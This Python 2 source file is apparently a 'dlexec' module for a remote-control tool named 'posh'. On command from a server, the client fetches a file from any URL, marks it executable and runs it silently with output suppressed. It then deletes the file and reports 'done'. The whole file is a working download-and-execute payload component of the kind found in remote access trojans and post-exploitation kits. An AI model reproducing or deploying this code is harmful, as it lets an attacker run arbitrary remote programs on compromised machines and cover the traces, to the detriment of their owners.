#!/usr/bin/env python3

# imports
import module

import os
import stat
import time
import urllib2
import tempfile
import subprocess as sp

MODNAME = 'dlexec'
USAGE = """Download and execute.
usage: dlexec [-h] [-s /path/to/save/to.txt] http://my.pro/gram
Download executable from internet and execute.
options:
-s, --save\tdon't execute, just save file to location
-h\t\t\tshow help"""


@module.server_handler(MODNAME)
def server(server, argv):
    if len(argv) < 2 or '-h' in argv or '--help' in argv:
        print USAGE
        return

    resp = server.conn.exchange(' '.join(argv))
    msg = 'successful' if resp == 'done' else 'error: ' + resp
    print 'posh : dlexec {}'.format(msg)


@module.client_handler(MODNAME)
def client(client, inp):
    """Download file from internet, save to temp file, execute.
    """

    inpv = inp.split()
    save = inpv[1] in ('-s', '--save')
    url = inpv[3] if save else inpv[1]

    r = urllib2.urlopen(url)
    if save:
        with open(inpv[2], 'w') as f:
            f.write(r.read())
        client.s.send('done')
        return
    else:
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(r.read())
            # f.flush()
            if not save:
                os.fchmod(f.fileno(), stat.S_IRWXU)
    try:
        sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
    except Exception:
        # if there was an error executing, clean up, then let the Exception
        # bubble up where the error will get sent to server
        os.remove(f.name)
        raise
    time.sleep(1)

    os.remove(f.name)
    client.s.send('done')
